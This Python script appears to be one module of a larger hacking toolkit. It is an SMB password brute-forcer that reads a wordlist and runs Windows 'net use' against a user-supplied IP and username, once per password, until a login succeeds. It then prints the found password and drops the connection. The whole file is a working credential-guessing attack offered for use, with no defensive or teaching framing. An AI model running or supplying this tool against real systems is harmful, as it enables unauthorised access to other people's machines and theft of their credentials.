from Config.Util import *
from Config.Config import *
import subprocess

def smb_bruteforce(ip, username, wordlist):
    with open(wordlist, 'r') as file:
        passwords = file.readlines()

    for count, password in enumerate(passwords, start=1):
        password = password.strip()
        print(f"\n{BEFORE + current_time_hour() + AFTER}{primary}[{secondary}{tr('ATTEMPT')} {count}{primary}] [{password}]")
        
        command = ['net', 'use', f'\\\\{ip}', f'/user:{username}', password]
        result = subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if result.returncode == 0:
            print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} {primary}{tr('PasswdFound')} {secondary}{password}")
            subprocess.run(['net', 'use', f'\\\\{ip}', '/d', '/y'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            break
    else:
        print(f"{tr('PasswdNoFound')}")
        Continue()
        Reset()

if __name__ == "__main__":
    ip = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT}{primary} {tr('EnterIPAdress')} -> {reset}")
    username = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT}{primary} {tr('EnterUsername')} -> {reset}")
    wordlist = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT}{primary} {tr('EnterPassList')} -> {reset}")
    
    smb_bruteforce(ip, username, wordlist)
